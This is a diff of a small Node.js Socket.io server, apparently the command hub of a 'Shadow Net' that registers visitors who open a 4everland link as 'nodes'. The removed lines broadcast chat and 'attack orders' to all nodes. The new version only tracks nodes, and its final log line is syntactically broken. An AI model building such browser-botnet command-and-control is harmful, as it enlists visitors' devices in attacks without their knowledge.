@@ -1,33 +1,39 @@
 const express = require('express');
+const http = require('http');
+const { Server } = require('socket.io');
+
 const app = express();
-const http = require('http').createServer(app);
-const io = require('socket.io')(http, { 
-    cors: { origin: "*" } 
+const server = http.createServer(app);
+
+// ESTO ES LO QUE TIENES QUE CAMBIAR:
+const io = new Server(server, {
+  cors: {
+    origin: "*", // Esto permite que 4everland se conecte
+    methods: ["GET", "POST"]
+  }
 });
 
 let nodes = [];
 
 io.on('connection', (socket) => {
-    // Cuando alguien abre el link de 4everland
-    socket.on('node_entry', (data) => {
-        socket.nodeId = data.id;
-        nodes.push(data.id);
-        io.emit('update_network', { total: nodes.length, nodes: nodes });
-    });
+  console.log('Nuevo nodo conectado:', socket.id);
 
-    // Para el chat y las órdenes de ataque
-    socket.on('send_chat', (msg) => { io.emit('receive_chat', msg); });
-    socket.on('new_task', (task) => { io.emit('task_broadcast', task); });
-
-    // Cuando alguien cierra la pestaña
-    socket.on('disconnect', () => {
-        nodes = nodes.filter(id => id !== socket.nodeId);
-        io.emit('update_network', { total: nodes.length, nodes: nodes });
+  socket.on('node_entry', (data) => {
+    if (!nodes.includes(data.id)) {
+      nodes.push(data.id);
+    }
+    io.emit('update_network', {
+      total: nodes.length,
+      nodes: nodes
     });
+  });
+
+  socket.on('disconnect', () => {
+    // Aquí puedes limpiar la lista si quieres
+  });
 });
 
 const PORT = process.env.PORT || 3000;
-http.listen(PORT, () => {
-    console.log('Cerebro Shadow Net v4.0 activo en puerto ' + PORT);
+server.listen(PORT, () => {
+  console.log(Servidor corriendo en puerto ${PORT});
 });
-
